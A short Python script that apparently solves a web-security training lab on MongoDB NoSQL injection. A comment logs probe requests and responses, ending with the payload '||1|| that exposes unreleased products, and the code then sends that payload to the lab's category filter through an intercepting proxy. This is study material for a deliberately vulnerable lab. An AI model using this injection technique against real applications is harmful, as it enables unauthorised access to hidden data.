'''
The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.
'''

import requests

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0ac4003e03e3106c83022eb600c70006.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

'''
GET /filter?category=Accessories' - 500 Syntax error
GET /filter?category=Accessories\' - 200 but no filtered products
GET /filter?category=Accessories'+%26%26+0+%26%26+'x - 200 but no filtered products
GET /filter?category=Accessories'+%26%26+1+%26%26+'x - 200 with filtered products
GET /filter?category=Accessories'||1||' - 200 with all products - incudling unreleased products
'''

payload = {
    'category':'\'||1||\''
}

s.get(f"{url}/filter", params=payload)